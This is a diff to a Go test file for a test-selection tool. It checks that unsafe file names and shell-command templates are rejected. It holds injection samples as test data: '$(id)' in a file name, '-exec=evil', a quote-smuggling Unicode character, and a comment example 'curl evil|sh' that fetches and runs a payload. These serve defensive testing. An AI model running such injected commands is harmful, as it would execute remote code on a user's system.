@@ -98,6 +98,11 @@ func TestUnsafeNamesRunFull(t *testing.T) {
 	if safeArg("-exec=evil") || safeArg("") {
 		t.Error("a leading - or an empty name passes")
 	}
+	// Windows: a child that parses its command line in the ANSI code page
+	// maps U+02BA to a double quote, so only ASCII names pass there.
+	if got := safeArg("./aʺb.java"); got == (runtime.GOOS == "windows") {
+		t.Errorf("U+02BA: safe = %v on %s", got, runtime.GOOS)
+	}
 	dir := tree(t, map[string]string{"package.json": `{"scripts":{"test":"jest"}}`, "src/a$(id).js": "x", "src/-rf.js": "x"})
 	if p := sel(t, dir, "npm test", "src/a$(id).js"); !p.Full || len(p.Run) != 0 {
 		t.Errorf("$(...): %+v", p)
@@ -139,7 +144,10 @@ func TestQuotedArgsSurviveTheShell(t *testing.T) {
 	if err != nil {
 		t.Skip(err)
 	}
-	args := []string{"./my dir/a b.js", "./ünï/çødé.py", "./x=1,y@2+3:z.go", "./plain/x_test.go"}
+	args := []string{"./my dir/a b.js", "./x=1,y@2+3:z.go", "./plain/x_test.go"}
+	if runtime.GOOS != "windows" {
+		args = append(args, "./ünï/çødé.py")
+	}
 	q, bad := quoteAll(args)
 	if bad != "" {
 		t.Fatalf("%q is not safe", bad)
@@ -221,6 +229,35 @@ func TestTemplate(t *testing.T) {
 		if got := testStem(f); got != want {
 			t.Errorf("testStem(%s) = %s", f, got)
 		}
+	}
+}
+
+// A template's words before the placeholder must not open a quote: the
+// rule `Bash(sh -c "pytest *)` would match `sh -c "pytest x; curl evil|sh"`.
+func TestTemplatePrefixWithShellSyntax(t *testing.T) {
+	for _, tmpl := range []string{`sh -c "pytest {files}"`, `cmd /c "pytest {files}"`, `pytest $(echo) {files}`, `bash -c 'pytest {files}'`} {
+		if pre, hint := Allowed("", "make check", tmpl); len(pre) != 0 || hint != "" {
+			t.Errorf("%s: allowed %q hint %q", tmpl, pre, hint)
+		}
+	}
+}
+
+// The template's command picks the selection: a pytest template in a repo
+// with a go.mod gets pytest's test files, not Go's.
+func TestTemplateSelectionFollowsTheCommand(t *testing.T) {
+	dir := tree(t, map[string]string{
+		"go.mod": "module example.com/m\n\ngo 1.22\n", "a/a.go": "package a\n", "a/a_test.go": "package a\n",
+		"py/mod.py": "", "py/test_mod.py": "from py import mod\n",
+	})
+	in := Input{Root: dir, Dir: dir, Files: []string{"py/mod.py"}}
+	p := Select(context.Background(), "make py", "python -m pytest -q {test_files}", in)
+	if p.Full || len(p.Run) != 1 || p.Run[0] != "python -m pytest -q ./py/test_mod.py" {
+		t.Errorf("pytest template: %+v", p)
+	}
+	in.Files = []string{"a/a.go"}
+	p = Select(context.Background(), "make go", "go test {packages}", in)
+	if p.Full || len(p.Run) != 1 || p.Run[0] != "go test ./a" {
+		t.Errorf("go template: %+v", p)
 	}
 }
 
